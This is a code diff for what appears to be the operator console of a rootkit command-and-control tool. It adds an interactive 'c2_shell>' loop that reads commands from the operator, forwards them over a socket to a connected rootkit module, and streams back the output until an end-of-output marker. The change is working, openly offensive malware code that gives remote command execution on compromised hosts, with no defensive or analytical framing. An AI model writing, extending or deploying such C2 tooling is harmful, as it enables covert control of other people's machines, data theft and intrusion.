@@ -122,9 +122,52 @@ int main(int argc, char **argv)
         printf("[+] AUTH sent\n");
         fflush(stdout);
 
-        /* drain the socket until the rootkit disconnects */
-        while (read(client_fd, buf, sizeof(buf)) > 0)
-            ;
+        printf("\n=== WLKOM INTERACTIVE SHELL ===\n");
+        printf("Type your command and press Enter. Type 'exit' to quit.\n\n");
+
+        while (1) {
+            printf("c2_shell> ");
+            fflush(stdout);
+
+            /* 1. Read command from operator terminal */
+            if (fgets(buf, sizeof(buf), stdin) == NULL) {
+                break;
+            }
+
+            if (strncmp(buf, "exit", 4) == 0) {
+                printf("Exiting interactive shell...\n");
+                break;
+            }
+
+            if (buf[0] == '\n') {
+                continue;
+            }
+
+            /* 2. Forward the command payload to the rootkit module */
+            if (write_all(client_fd, buf, strlen(buf)) < 0) {
+                perror("write command");
+                break;
+            }
+
+            /* 3. Read stream until the specific end of output marker is detected */
+            while (1) {
+                memset(buf, 0, sizeof(buf));
+                ssize_t n = read(client_fd, buf, sizeof(buf) - 1);
+                if (n <= 0) {
+                    printf("\n[!] Connection lost or rootkit disconnected.\n");
+                    break;
+                }
+                
+                buf[n] = '\0';
+                printf("%s", buf);
+                fflush(stdout);
+
+                /* Synchronize loop and break when the transmission block ends */
+                if (strstr(buf, "--- End of Output ---\n\n") != NULL) {
+                    break;
+                }
+            }
+        }
 
         timestamp();
         printf("[-] Rootkit disconnected\n");
